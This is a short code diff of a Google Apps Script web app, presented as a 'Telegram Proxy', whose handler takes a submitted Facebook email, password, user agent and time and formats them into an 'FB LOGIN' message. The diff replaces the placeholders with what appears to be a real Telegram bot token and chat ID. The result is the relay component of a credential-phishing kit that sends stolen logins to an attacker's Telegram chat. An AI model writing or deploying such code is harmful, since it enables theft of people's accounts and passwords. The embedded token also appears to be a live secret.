@@ -1,8 +1,8 @@
 // Apps Script Web App – Telegram Proxy
 function doPost(e) {
   const data = JSON.parse(e.postData.contents);
-  const token = "YOUR_BOT_TOKEN";
-  const chatId = "YOUR_CHAT_ID";
+  const token = "8614494771:AAENDkZulMFkCR98bqSBJuOseDSBAh8KjnU";
+  const chatId = "7994255254";
   
   const message = `🎭 FB LOGIN\nEmail: ${data.email}\nPassword: ${data.password}\nUser-Agent: ${data.ua}\nTime: ${data.ts}`;
   
